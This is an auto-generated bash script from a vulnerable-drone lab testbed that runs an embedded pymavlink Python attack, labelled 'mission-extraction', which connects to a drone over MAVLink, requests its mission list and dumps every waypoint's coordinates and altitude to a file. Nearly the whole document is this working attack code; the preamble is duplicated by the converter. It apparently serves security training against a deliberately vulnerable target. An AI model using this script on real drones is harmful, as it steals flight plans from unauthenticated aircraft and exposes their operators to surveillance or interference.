#!/usr/bin/env bash
set -euo pipefail
export BASE="${BASE:-$PWD}"
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
  log(){ printf '[%(%F_%T)T] %s
' -1 "$*"; }
fi

# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Mission-Extraction.md
# Created: 2025-09-10 04:31:52
# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.
set -euo pipefail

# 기준 경로 (요구사항)
export BASE="${BASE:-$PWD}"

# 공통 로그 연결(선택사항) - 존재 시 로드
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
  log(){ echo "[`date +%F_%T`] $*"; }; export -f log
fi

log "[ATTACK] id=mission-extraction src=Mission-Extraction.md"
log "[BLOCK 1] type=python"
python3 - <<'PY'
# --- argv glue for converter ---
import os, sys, re
if len(sys.argv) <= 1:
    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:127.0.0.1:14550')
    if ep.startswith('udp:'):
        try:
            _, rest = ep.split(':', 1)
            ep = rest
        except ValueError:
            pass
    # expect ip:port
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
        sys.argv = [sys.argv[0], ep]
from pymavlink import mavutil

# Connect to the drone
master = mavutil.mavlink_connection("tcp:10.13.0.3:5760")
master.wait_heartbeat()
print("Connected to the drone.")

# Request list of mission items
master.mav.mission_request_list_send(master.target_system, master.target_component)

waypoints = []

while True:
    msg = master.recv_match(type=["MISSION_COUNT", "MISSION_ITEM_INT"], blocking=True)
    if msg.get_type() == "MISSION_COUNT":
        print(f"Expecting {msg.count} mission items...")
    elif msg.get_type() == "MISSION_ITEM_INT":
        waypoints.append(msg)
        print(f"Waypoint #{msg.seq}: lat={msg.x/1e7}, lon={msg.y/1e7}, alt={msg.z}m")
        if len(waypoints) == msg.seq + 1:
            break

# Save extracted waypoints to file
with open("mission_dump.txt", "w") as f:
    for wp in waypoints:
        f.write(f"{wp.seq},{wp.command},{wp.frame},{wp.x/1e7},{wp.y/1e7},{wp.z}\n")

print("Mission extraction complete. Saved to mission_dump.txt")
PY

log "[BLOCK 2] type=shell"
python3 extract_mission.py

